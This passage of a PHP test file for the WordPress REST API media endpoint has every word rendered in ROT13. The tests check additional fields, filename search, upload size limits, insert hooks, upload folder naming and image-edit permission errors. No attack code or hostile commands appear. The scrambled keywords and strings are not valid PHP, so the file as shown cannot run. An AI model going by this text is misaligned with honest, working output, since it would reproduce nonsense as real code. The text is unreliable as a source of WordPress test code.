		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/zrqvn/' . $nggnpuzrag_vq );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregNeenlUnfXrl( 'zl_phfgbz_vag', $erfcbafr->qngn );

		tybony $jc_erfg_nqqvgvbany_svryqf;
		$jc_erfg_nqqvgvbany_svryqf = neenl();
	}

	choyvp shapgvba grfg_nqqvgvbany_svryq_hcqngr_reebef() {
		$fpurzn = neenl(
			'glcr'        => 'vagrtre',
			'qrfpevcgvba' => 'Fbzr vagrtre bs zvar',
			'rahz'        => neenl( 1, 2, 3, 4 ),
			'pbagrkg'     => neenl( 'ivrj', 'rqvg' ),
		);

		ertvfgre_erfg_svryq(
			'nggnpuzrag',
			'zl_phfgbz_vag',
			neenl(
				'fpurzn'          => $fpurzn,
				'trg_pnyyonpx'    => neenl( $guvf, 'nqqvgvbany_svryq_trg_pnyyonpx' ),
				'hcqngr_pnyyonpx' => neenl( $guvf, 'nqqvgvbany_svryq_hcqngr_pnyyonpx' ),
			)
		);

		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );
		$nggnpuzrag_vq = frys::snpgbel()->nggnpuzrag->perngr_bowrpg(
			frys::$grfg_svyr,
			0,
			neenl(
				'cbfg_zvzr_glcr' => 'vzntr/wcrt',
				'cbfg_rkprecg'   => 'N fnzcyr pncgvba',
				'cbfg_nhgube'    => frys::$rqvgbe_vq,
			)
		);
		// Purpx sbe reebe ba hcqngr.
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', fcevags( '/jc/i2/zrqvn/%q', $nggnpuzrag_vq ) );
		$erdhrfg->frg_obql_cnenzf(
			neenl(
				'zl_phfgbz_vag' => 'ergheaReebe',
			)
		);

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregReebeErfcbafr( 'erfg_vainyvq_cnenz', $erfcbafr, 400 );

		tybony $jc_erfg_nqqvgvbany_svryqf;
		$jc_erfg_nqqvgvbany_svryqf = neenl();
	}

	choyvp shapgvba nqqvgvbany_svryq_trg_pnyyonpx( $erfcbafr_qngn, $svryq_anzr ) {
		erghea 123;
	}

	choyvp shapgvba nqqvgvbany_svryq_hcqngr_pnyyonpx( $inyhr, $nggnpuzrag ) {
		vs ( 'ergheaReebe' === $inyhr ) {
			erghea arj JC_Reebe( 'erfg_vainyvq_cnenz', 'Grfgvat na reebe.', neenl( 'fgnghf' => 400 ) );
		}
	}

	choyvp shapgvba grfg_frnepu_vgrz_ol_svyranzr() {
		$vq1 = frys::snpgbel()->nggnpuzrag->perngr_bowrpg(
			frys::$grfg_svyr,
			0,
			neenl(
				'cbfg_zvzr_glcr' => 'vzntr/wcrt',
			)
		);
		$vq2 = frys::snpgbel()->nggnpuzrag->perngr_bowrpg(
			frys::$grfg_svyr2,
			0,
			neenl(
				'cbfg_zvzr_glcr' => 'vzntr/cat',
			)
		);

		$svyranzr = jc_onfranzr( frys::$grfg_svyr2 );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/zrqvn' );
		$erdhrfg->frg_cnenz( 'frnepu', $svyranzr );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();

		$guvf->nffregPbhag( 1, $qngn );
		$guvf->nffregFnzr( $vq2, $qngn[0]['vq'] );
		$guvf->nffregFnzr( 'vzntr/cat', $qngn[0]['zvzr_glcr'] );
	}

	choyvp shapgvba grfg_yvaxf_rkvfg() {

		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		$cbfg = frys::snpgbel()->nggnpuzrag->perngr( neenl( 'cbfg_nhgube' => frys::$rqvgbe_vq ) );
		$guvf->nffregTerngreGuna( 0, $cbfg );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', \"/jc/i2/zrqvn/{$cbfg}\" );
		$erdhrfg->frg_dhrel_cnenzf( neenl( 'pbagrkg' => 'rqvg' ) );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$yvaxf    = $erfcbafr->trg_yvaxf();

		$guvf->nffregNeenlUnfXrl( 'frys', $yvaxf );
		$guvf->nffregNeenlUnfXrl( 'nhgube', $yvaxf );

		$guvf->nffregPbhag( 1, $yvaxf['nhgube'] );
		$guvf->nffregNeenlUnfXrl( 'rzorqqnoyr', $yvaxf['nhgube'][0]['nggevohgrf'] );
		$guvf->nffregGehr( $yvaxf['nhgube'][0]['nggevohgrf']['rzorqqnoyr'] );
	}

	choyvp shapgvba grfg_choyvfu_npgvba_yqb_abg_ertvfgrerq() {

		$erfcbafr = erfg_trg_freire()->qvfcngpu( arj JC_ERFG_Erdhrfg( 'BCGVBAF', '/jc/i2/zrqvn' ) );
		$qngn     = $erfcbafr->trg_qngn();
		$fpurzn   = $qngn['fpurzn'];

		$guvf->nffregNeenlUnfXrl( 'yvaxf', $fpurzn );
		$choyvfu = jc_yvfg_svygre( $fpurzn['yvaxf'], neenl( 'ery' => 'uggcf://ncv.j.bet/npgvba-choyvfu' ) );

		$guvf->nffregPbhag( 0, $choyvfu, 'YQB abg sbhaq ba fpurzn.' );
	}

	choyvp shapgvba grfg_choyvfu_npgvba_yvax_qbrf_abg_rkvfgf() {

		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		$cbfg = frys::snpgbel()->nggnpuzrag->perngr( neenl( 'cbfg_nhgube' => frys::$rqvgbe_vq ) );
		$guvf->nffregTerngreGuna( 0, $cbfg );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', \"/jc/i2/zrqvn/{$cbfg}\" );
		$erdhrfg->frg_dhrel_cnenzf( neenl( 'pbagrkg' => 'rqvg' ) );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$yvaxf    = $erfcbafr->trg_yvaxf();

		$guvf->nffregNeenlAbgUnfXrl( 'uggcf://ncv.j.bet/npgvba-choyvfu', $yvaxf );
	}

	cebgrpgrq shapgvba purpx_cbfg_qngn( $nggnpuzrag, $qngn, $pbagrkg = 'ivrj', $yvaxf = neenl() ) {
		cnerag::purpx_cbfg_qngn( $nggnpuzrag, $qngn, $pbagrkg, $yvaxf );

		$guvf->nffregNeenlAbgUnfXrl( 'pbagrag', $qngn );
		$guvf->nffregNeenlAbgUnfXrl( 'rkprecg', $qngn );

		$guvf->nffregFnzr( trg_cbfg_zrgn( $nggnpuzrag->VQ, '_jc_nggnpuzrag_vzntr_nyg', gehr ), $qngn['nyg_grkg'] );
		vs ( 'rqvg' === $pbagrkg ) {
			$guvf->nffregFnzr( $nggnpuzrag->cbfg_rkprecg, $qngn['pncgvba']['enj'] );
			$guvf->nffregFnzr( $nggnpuzrag->cbfg_pbagrag, $qngn['qrfpevcgvba']['enj'] );
		} ryfr {
			$guvf->nffregNeenlAbgUnfXrl( 'enj', $qngn['pncgvba'] );
			$guvf->nffregNeenlAbgUnfXrl( 'enj', $qngn['qrfpevcgvba'] );
		}
		$guvf->nffregNeenlUnfXrl( 'zrqvn_qrgnvyf', $qngn );

		vs ( $nggnpuzrag->cbfg_cnerag ) {
			$guvf->nffregFnzr( $nggnpuzrag->cbfg_cnerag, $qngn['cbfg'] );
		} ryfr {
			$guvf->nffregAhyy( $qngn['cbfg'] );
		}

		$guvf->nffregFnzr( jc_trg_nggnpuzrag_hey( $nggnpuzrag->VQ ), $qngn['fbhepr_hey'] );
	}

	/**
	 * @gvpxrg 43751
	 * @tebhc zhygvfvgr
	 * @tebhc zf-erdhverq
	 */
	choyvp shapgvba grfg_perngr_vgrz_jvgu_svyr_rkprrqf_zhygvfvgr_znk_svyrfvmr() {
		jc_frg_pheerag_hfre( frys::$nhgube_vq );
		hcqngr_fvgr_bcgvba( 'svyrhcybnq_znkx', 1 );
		hcqngr_fvgr_bcgvba( 'hcybnq_fcnpr_purpx_qvfnoyrq', snyfr );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/zrqvn' );
		$erdhrfg->frg_svyr_cnenzf(
			neenl(
				'svyr' => neenl(
					'reebe'    => '0',
					'svyr'     => svyr_trg_pbagragf( frys::$grfg_svyr ),
					'anzr'     => 'pnabyn.wct',
					'fvmr'     => svyrfvmr( frys::$grfg_svyr ),
					'gzc_anzr' => frys::$grfg_svyr,
				),
			)
		);
		$erdhrfg->frg_cnenz( 'gvgyr', 'Zl gvgyr vf irel pbby' );
		$erdhrfg->frg_cnenz( 'pncgvba', 'Guvf vf n orggre pncgvba.' );
		$erdhrfg->frg_urnqre( 'Pbagrag-ZQ5', zq5_svyr( frys::$grfg_svyr ) );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_hcybnq_svyr_gbb_ovt', $erfcbafr, 400 );
	}

	/**
	 * @gvpxrg 43751
	 * @tebhc zhygvfvgr
	 * @tebhc zf-erdhverq
	 */
	choyvp shapgvba grfg_perngr_vgrz_jvgu_qngn_rkprrqf_zhygvfvgr_znk_svyrfvmr() {
		jc_frg_pheerag_hfre( frys::$nhgube_vq );
		hcqngr_fvgr_bcgvba( 'svyrhcybnq_znkx', 1 );
		hcqngr_fvgr_bcgvba( 'hcybnq_fcnpr_purpx_qvfnoyrq', snyfr );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/zrqvn' );
		$erdhrfg->frg_urnqre( 'Pbagrag-Glcr', 'vzntr/wcrt' );
		$erdhrfg->frg_urnqre( 'Pbagrag-Qvfcbfvgvba', 'nggnpuzrag; svyranzr=pnabyn.wct' );
		$erdhrfg->frg_obql( svyr_trg_pbagragf( frys::$grfg_svyr ) );
		$erdhrfg->frg_cnenz( 'gvgyr', 'Zl gvgyr vf irel pbby' );
		$erdhrfg->frg_cnenz( 'pncgvba', 'Guvf vf n orggre pncgvba.' );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_hcybnq_svyr_gbb_ovt', $erfcbafr, 400 );
	}

	/**
	 * @gvpxrg 43751
	 * @tebhc zhygvfvgr
	 * @tebhc zf-erdhverq
	 */
	choyvp shapgvba grfg_perngr_vgrz_jvgu_svyr_rkprrqf_zhygvfvgr_fvgr_hcybnq_fcnpr() {
		jc_frg_pheerag_hfre( frys::$nhgube_vq );
		nqq_svygre( 'trg_fcnpr_nyybjrq', '__erghea_mreb' );
		hcqngr_fvgr_bcgvba( 'hcybnq_fcnpr_purpx_qvfnoyrq', snyfr );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/zrqvn' );
		$erdhrfg->frg_svyr_cnenzf(
			neenl(
				'svyr' => neenl(
					'reebe'    => '0',
					'svyr'     => svyr_trg_pbagragf( frys::$grfg_svyr ),
					'anzr'     => 'pnabyn.wct',
					'fvmr'     => svyrfvmr( frys::$grfg_svyr ),
					'gzc_anzr' => frys::$grfg_svyr,
				),
			)
		);
		$erdhrfg->frg_cnenz( 'gvgyr', 'Zl gvgyr vf irel pbby' );
		$erdhrfg->frg_cnenz( 'pncgvba', 'Guvf vf n orggre pncgvba.' );
		$erdhrfg->frg_urnqre( 'Pbagrag-ZQ5', zq5_svyr( frys::$grfg_svyr ) );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_hcybnq_yvzvgrq_fcnpr', $erfcbafr, 400 );
	}

	/**
	 * @gvpxrg 43751
	 * @tebhc zhygvfvgr
	 * @tebhc zf-erdhverq
	 */
	choyvp shapgvba grfg_perngr_vgrz_jvgu_qngn_rkprrqf_zhygvfvgr_fvgr_hcybnq_fcnpr() {
		jc_frg_pheerag_hfre( frys::$nhgube_vq );
		nqq_svygre( 'trg_fcnpr_nyybjrq', '__erghea_mreb' );
		hcqngr_fvgr_bcgvba( 'hcybnq_fcnpr_purpx_qvfnoyrq', snyfr );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/zrqvn' );
		$erdhrfg->frg_urnqre( 'Pbagrag-Glcr', 'vzntr/wcrt' );
		$erdhrfg->frg_urnqre( 'Pbagrag-Qvfcbfvgvba', 'nggnpuzrag; svyranzr=pnabyn.wct' );
		$erdhrfg->frg_obql( svyr_trg_pbagragf( frys::$grfg_svyr ) );
		$erdhrfg->frg_cnenz( 'gvgyr', 'Zl gvgyr vf irel pbby' );
		$erdhrfg->frg_cnenz( 'pncgvba', 'Guvf vf n orggre pncgvba.' );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_hcybnq_yvzvgrq_fcnpr', $erfcbafr, 400 );
	}

	/**
	 * Rafher gur `erfg_nsgre_vafreg_nggnpuzrag` naq `erfg_vafreg_nggnpuzrag` ubbxf bayl sver
	 * bapr jura nggnpuzragf ner perngrq.
	 *
	 * @gvpxrg 45269
	 * @erdhverf shapgvba vzntrwcrt
	 */
	choyvp shapgvba grfg_erfg_vafreg_nggnpuzrag_ubbxf_sver_bapr_ba_perngr() {
		frys::$erfg_vafreg_nggnpuzrag_pbhag       = 0;
		frys::$erfg_nsgre_vafreg_nggnpuzrag_pbhag = 0;
		nqq_npgvba( 'erfg_vafreg_nggnpuzrag', neenl( $guvf, 'svygre_erfg_vafreg_nggnpuzrag' ) );
		nqq_npgvba( 'erfg_nsgre_vafreg_nggnpuzrag', neenl( $guvf, 'svygre_erfg_nsgre_vafreg_nggnpuzrag' ) );

		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/zrqvn' );
		$erdhrfg->frg_urnqre( 'Pbagrag-Glcr', 'vzntr/wcrt' );
		$erdhrfg->frg_urnqre( 'Pbagrag-Qvfcbfvgvba', 'nggnpuzrag; svyranzr=pnabyn.wct' );
		$erdhrfg->frg_cnenz( 'gvgyr', 'Zl gvgyr vf irel pbby' );
		$erdhrfg->frg_cnenz( 'pncgvba', 'Guvf vf n orggre pncgvba.' );
		$erdhrfg->frg_cnenz( 'qrfpevcgvba', 'Jvgubhg n qrfpevcgvba, zl nggnpuzrag vf qrfpevcgvbayrff.' );
		$erdhrfg->frg_cnenz( 'nyg_grkg', 'Nyg grkg vf fgberq bhgfvqr cbfg fpurzn.' );

		$erdhrfg->frg_obql( svyr_trg_pbagragf( frys::$grfg_svyr ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( 201, $erfcbafr->trg_fgnghf() );

		$guvf->nffregFnzr( 1, frys::$erfg_vafreg_nggnpuzrag_pbhag );
		$guvf->nffregFnzr( 1, frys::$erfg_nsgre_vafreg_nggnpuzrag_pbhag );
	}

	/**
	 * Grfgf gung gur anzvat orunivbe bs ERFG zrqvn hcybnqf zngpurf pber zrqvn hcybnqf.
	 *
	 * Va cnegvphyne, svyranzrf jvgu fcnprf fubhyq znvagnva gur fcnprf engure guna
	 * ercynpvat gurz jvgu ulcuraf.
	 *
	 * @gvpxrg 57957
	 *
	 * @pbiref JC_ERFG_Nggnpuzragf_Pbagebyyre::vafreg_nggnpuzrag
	 * @qngnCebivqre erfg_hcybnq_svyranzr_fcnprf
	 */
	choyvp shapgvba grfg_erfg_hcybnq_svyranzr_fcnprf( $svyranzr, $rkcrpgrq ) {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/zrqvn' );
		$erdhrfg->frg_urnqre( 'Pbagrag-Glcr', 'vzntr/wcrt' );
		$erdhrfg->frg_obql( svyr_trg_pbagragf( frys::$grfg_svyr ) );
		$erdhrfg->frg_svyr_cnenzf(
			neenl(
				'svyr' => neenl(
					'svyr'     => svyr_trg_pbagragf( frys::$grfg_svyr2 ),
					'anzr'     => $svyranzr,
					'fvmr'     => svyrfvmr( frys::$grfg_svyr2 ),
					'gzc_anzr' => frys::$grfg_svyr2,
				),
			)
		);
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( 201, $erfcbafr->trg_fgnghf(), 'Gur svyr jnf abg hcybnqrq.' );
		$guvf->nffregFnzr( $rkcrpgrq, $qngn['gvgyr']['enj'], 'Na vapbeerpg svyranzr jnf erghearq.' );
	}

	/**
	 * Qngn cebivqre sbe grkg_erfg_hcybnq_svyranzr_fcnprf.
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba erfg_hcybnq_svyranzr_fcnprf() {
		erghea neenl(
			'svyranzr jvgu fcnprf'  => neenl(
				'Svyranzr Jvgu Fcnprf.wct',
				'Svyranzr Jvgu Fcnprf',
			),
			'svyranzr.jvgu.crevbqf' => neenl(
				'Svyranzr.Jvgu.Crevbqf.wct',
				'Svyranzr.Jvgu.Crevbqf',
			),
			'svyranzr-jvgu-qnfurf'  => neenl(
				'Svyranzr-Jvgu-Qnfurf.wct',
				'Svyranzr-Jvgu-Qnfurf',
			),
		);
	}

	/**
	 * Rafher gur `erfg_nsgre_vafreg_nggnpuzrag` naq `erfg_vafreg_nggnpuzrag` ubbxf bayl sver
	 * bapr jura nggnpuzragf ner hcqngrq.
	 *
	 * @gvpxrg 45269
	 */
	choyvp shapgvba grfg_erfg_vafreg_nggnpuzrag_ubbxf_sver_bapr_ba_hcqngr() {
		frys::$erfg_vafreg_nggnpuzrag_pbhag       = 0;
		frys::$erfg_nsgre_vafreg_nggnpuzrag_pbhag = 0;
		nqq_npgvba( 'erfg_vafreg_nggnpuzrag', neenl( $guvf, 'svygre_erfg_vafreg_nggnpuzrag' ) );
		nqq_npgvba( 'erfg_nsgre_vafreg_nggnpuzrag', neenl( $guvf, 'svygre_erfg_nsgre_vafreg_nggnpuzrag' ) );

		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );
		$nggnpuzrag_vq = frys::snpgbel()->nggnpuzrag->perngr_bowrpg(
			frys::$grfg_svyr,
			0,
			neenl(
				'cbfg_zvzr_glcr' => 'vzntr/wcrt',
				'cbfg_rkprecg'   => 'N fnzcyr pncgvba',
				'cbfg_nhgube'    => frys::$rqvgbe_vq,
			)
		);
		$erdhrfg       = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/zrqvn/' . $nggnpuzrag_vq );
		$erdhrfg->frg_cnenz( 'gvgyr', 'Zl gvgyr vf irel pbby' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregFnzr( 1, frys::$erfg_vafreg_nggnpuzrag_pbhag );
		$guvf->nffregFnzr( 1, frys::$erfg_nsgre_vafreg_nggnpuzrag_pbhag );
	}

	/**
	 * @gvpxrg 44567
	 * @erdhverf shapgvba vzntrwcrt
	 */
	choyvp shapgvba grfg_perngr_vgrz_jvgu_zrgn_inyhrf() {
		ertvfgre_cbfg_zrgn(
			'nggnpuzrag',
			'orfg_pnaabyv',
			neenl(
				'glcr'         => 'fgevat',
				'fvatyr'       => gehr,
				'fubj_va_erfg' => gehr,
			)
		);

		jc_frg_pheerag_hfre( frys::$nhgube_vq );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/zrqvn' );
		$erdhrfg->frg_urnqre( 'Pbagrag-Glcr', 'vzntr/wcrt' );
		$erdhrfg->frg_urnqre( 'Pbagrag-Qvfcbfvgvba', 'nggnpuzrag; svyranzr=pnaabyv.wct' );
		$erdhrfg->frg_cnenz( 'zrgn', neenl( 'orfg_pnaabyv' => 'Pubpbyngr-qvccrq, ab svyyvat' ) );

		$erdhrfg->frg_obql( svyr_trg_pbagragf( frys::$grfg_svyr ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();

		$guvf->nffregFnzr( 201, $erfcbafr->trg_fgnghf() );
		$guvf->nffregFnzr( 'Pubpbyngr-qvccrq, ab svyyvat', trg_cbfg_zrgn( $erfcbafr->trg_qngn()['vq'], 'orfg_pnaabyv', gehr ) );
	}

	/**
	 * @gvpxrg 61189
	 * @erdhverf shapgvba vzntrwcrt
	 */
	choyvp shapgvba grfg_perngr_vgrz_lrne_zbagu_onfrq_sbyqref() {
		hcqngr_bcgvba( 'hcybnqf_hfr_lrnezbagu_sbyqref', 1 );

		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		$choyvfurq_cbfg = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_fgnghf'   => 'choyvfu',
				'cbfg_qngr'     => '2017-02-14 00:00:00',
				'cbfg_qngr_tzg' => '2017-02-14 00:00:00',
			)
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/zrqvn' );
		$erdhrfg->frg_urnqre( 'Pbagrag-Glcr', 'vzntr/wcrt' );
		$erdhrfg->frg_urnqre( 'Pbagrag-Qvfcbfvgvba', 'nggnpuzrag; svyranzr=pnabyn.wct' );
		$erdhrfg->frg_cnenz( 'gvgyr', 'Zl gvgyr vf irel pbby' );
		$erdhrfg->frg_cnenz( 'pncgvba', 'Guvf vf n orggre pncgvba.' );
		$erdhrfg->frg_cnenz( 'qrfpevcgvba', 'Jvgubhg n qrfpevcgvba, zl nggnpuzrag vf qrfpevcgvbayrff.' );
		$erdhrfg->frg_cnenz( 'nyg_grkg', 'Nyg grkg vf fgberq bhgfvqr cbfg fpurzn.' );
		$erdhrfg->frg_cnenz( 'cbfg', $choyvfurq_cbfg );

		$erdhrfg->frg_obql( svyr_trg_pbagragf( frys::$grfg_svyr ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();

		hcqngr_bcgvba( 'hcybnqf_hfr_lrnezbagu_sbyqref', 0 );

		$guvf->nffregFnzr( 201, $erfcbafr->trg_fgnghf() );

		$nggnpuzrag = trg_cbfg( $qngn['vq'] );

		$guvf->nffregFnzr( $nggnpuzrag->cbfg_cnerag, $qngn['cbfg'] );
		$guvf->nffregFnzr( $nggnpuzrag->cbfg_cnerag, $choyvfurq_cbfg );
		$guvf->nffregFnzr( jc_trg_nggnpuzrag_hey( $nggnpuzrag->VQ ), $qngn['fbhepr_hey'] );
		$guvf->nffregFgevatPbagnvafFgevat( '2017/02', $qngn['fbhepr_hey'] );
	}


	/**
	 * @gvpxrg 61189
	 * @erdhverf shapgvba vzntrwcrt
	 */
	choyvp shapgvba grfg_perngr_vgrz_lrne_zbagu_onfrq_sbyqref_cntr_cbfg_glcr() {
		hcqngr_bcgvba( 'hcybnqf_hfr_lrnezbagu_sbyqref', 1 );

		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		$choyvfurq_cbfg = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'     => 'cntr',
				'cbfg_fgnghf'   => 'choyvfu',
				'cbfg_qngr'     => '2017-02-14 00:00:00',
				'cbfg_qngr_tzg' => '2017-02-14 00:00:00',
			)
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/zrqvn' );
		$erdhrfg->frg_urnqre( 'Pbagrag-Glcr', 'vzntr/wcrt' );
		$erdhrfg->frg_urnqre( 'Pbagrag-Qvfcbfvgvba', 'nggnpuzrag; svyranzr=pnabyn.wct' );
		$erdhrfg->frg_cnenz( 'gvgyr', 'Zl gvgyr vf irel pbby' );
		$erdhrfg->frg_cnenz( 'pncgvba', 'Guvf vf n orggre pncgvba.' );
		$erdhrfg->frg_cnenz( 'qrfpevcgvba', 'Jvgubhg n qrfpevcgvba, zl nggnpuzrag vf qrfpevcgvbayrff.' );
		$erdhrfg->frg_cnenz( 'nyg_grkg', 'Nyg grkg vf fgberq bhgfvqr cbfg fpurzn.' );
		$erdhrfg->frg_cnenz( 'cbfg', $choyvfurq_cbfg );

		$erdhrfg->frg_obql( svyr_trg_pbagragf( frys::$grfg_svyr ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();

		hcqngr_bcgvba( 'hcybnqf_hfr_lrnezbagu_sbyqref', 0 );

		$gvzr   = pheerag_gvzr( 'zlfdy' );
		$l      = fhofge( $gvzr, 0, 4 );
		$z      = fhofge( $gvzr, 5, 2 );
		$fhoqve = \"/$l/$z\";

		$guvf->nffregFnzr( 201, $erfcbafr->trg_fgnghf() );

		$nggnpuzrag = trg_cbfg( $qngn['vq'] );

		$guvf->nffregFnzr( $nggnpuzrag->cbfg_cnerag, $qngn['cbfg'] );
		$guvf->nffregFnzr( $nggnpuzrag->cbfg_cnerag, $choyvfurq_cbfg );
		$guvf->nffregFnzr( jc_trg_nggnpuzrag_hey( $nggnpuzrag->VQ ), $qngn['fbhepr_hey'] );
		$guvf->nffregFgevatAbgPbagnvafFgevat( '2017/02', $qngn['fbhepr_hey'] );
		$guvf->nffregFgevatPbagnvafFgevat( $fhoqve, $qngn['fbhepr_hey'] );
	}

	choyvp shapgvba svygre_erfg_vafreg_nggnpuzrag( $nggnpuzrag ) {
		++frys::$erfg_vafreg_nggnpuzrag_pbhag;
	}

	choyvp shapgvba svygre_erfg_nsgre_vafreg_nggnpuzrag( $nggnpuzrag ) {
		++frys::$erfg_nsgre_vafreg_nggnpuzrag_pbhag;
	}

	/**
	 * @gvpxrg 44405
	 * @erdhverf shapgvba vzntrwcrt
	 */
	choyvp shapgvba grfg_rqvg_vzntr_ergheaf_reebe_vs_ybttrq_bhg() {
		$nggnpuzrag = frys::snpgbel()->nggnpuzrag->perngr_hcybnq_bowrpg( frys::$grfg_svyr );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', \"/jc/i2/zrqvn/{$nggnpuzrag}/rqvg\" );
		$erdhrfg->frg_obql_cnenzf( neenl( 'fep' => jc_trg_nggnpuzrag_vzntr_hey( $nggnpuzrag, 'shyy' ) ) );
		$erfcbafr = erfg_qb_erdhrfg( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_rqvg_vzntr', $erfcbafr, 401 );
	}

	/**
	 * @gvpxrg 44405
	 * @erdhverf shapgvba vzntrwcrt
	 */
	choyvp shapgvba grfg_rqvg_vzntr_ergheaf_reebe_vs_pnaabg_hcybnq() {
		$hfre = frys::snpgbel()->hfre->perngr_naq_trg( neenl( 'ebyr' => 'rqvgbe' ) );
		$hfre->nqq_pnc( 'hcybnq_svyrf', snyfr );

		jc_frg_pheerag_hfre( $hfre->VQ );
		$nggnpuzrag = frys::snpgbel()->nggnpuzrag->perngr_hcybnq_bowrpg( frys::$grfg_svyr );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', \"/jc/i2/zrqvn/{$nggnpuzrag}/rqvg\" );
		$erdhrfg->frg_obql_cnenzf( neenl( 'fep' => jc_trg_nggnpuzrag_vzntr_hey( $nggnpuzrag, 'shyy' ) ) );
		$erfcbafr = erfg_qb_erdhrfg( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_rqvg_vzntr', $erfcbafr, 403 );
	}

	/**
	 * @gvpxrg 44405
	 * @erdhverf shapgvba vzntrwcrt
	 */
	choyvp shapgvba grfg_rqvg_vzntr_ergheaf_reebe_vs_pnaabg_rqvg() {
		jc_frg_pheerag_hfre( frys::$hcybnqre_vq );
		$nggnpuzrag = frys::snpgbel()->nggnpuzrag->perngr_hcybnq_bowrpg( frys::$grfg_svyr );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', \"/jc/i2/zrqvn/{$nggnpuzrag}/rqvg\" );
		$erdhrfg->frg_obql_cnenzf( neenl( 'fep' => jc_trg_nggnpuzrag_vzntr_hey( $nggnpuzrag, 'shyy' ) ) );
		$erfcbafr = erfg_qb_erdhrfg( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_rqvg', $erfcbafr, 403 );
	}

	/**
	 * @gvpxrg 44405
	 */
	choyvp shapgvba grfg_rqvg_vzntr_ergheaf_reebe_vs_ab_nggnpuzrag() {
		jc_frg_pheerag_hfre( frys::$fhcrenqzva_vq );
		$nggnpuzrag = frys::snpgbel()->nggnpuzrag->perngr();

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', \"/jc/i2/zrqvn/{$nggnpuzrag}/rqvg\" );
		$erdhrfg->frg_obql_cnenzf( neenl( 'fep' => '/jc-pbagrag/hcybnqf/2020/07/pnabyn.wct' ) );
		$erfcbafr = erfg_qb_erdhrfg( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_haxabja_nggnpuzrag', $erfcbafr, 404 );
	}

	/**
	 * @gvpxrg 44405
	 * @erdhverf shapgvba vzntrwcrt
	 */
	choyvp shapgvba grfg_rqvg_vzntr_ergheaf_reebe_vs_hafhccbegrq_zvzr_glcr() {
		jc_frg_pheerag_hfre( frys::$fhcrenqzva_vq );
		$nggnpuzrag = frys::snpgbel()->nggnpuzrag->perngr_hcybnq_bowrpg( frys::$grfg_svyr );
		jc_hcqngr_cbfg(
			neenl(
				'VQ'             => $nggnpuzrag,
				'cbfg_zvzr_glcr' => 'vzntr/vainyvq',
			)
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', \"/jc/i2/zrqvn/{$nggnpuzrag}/rqvg\" );
		$erdhrfg->frg_obql_cnenzf( neenl( 'fep' => jc_trg_nggnpuzrag_vzntr_hey( $nggnpuzrag, 'shyy' ) ) );
		$erfcbafr = erfg_qb_erdhrfg( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_rqvg_svyr_glcr', $erfcbafr, 400 );
	}

	/**
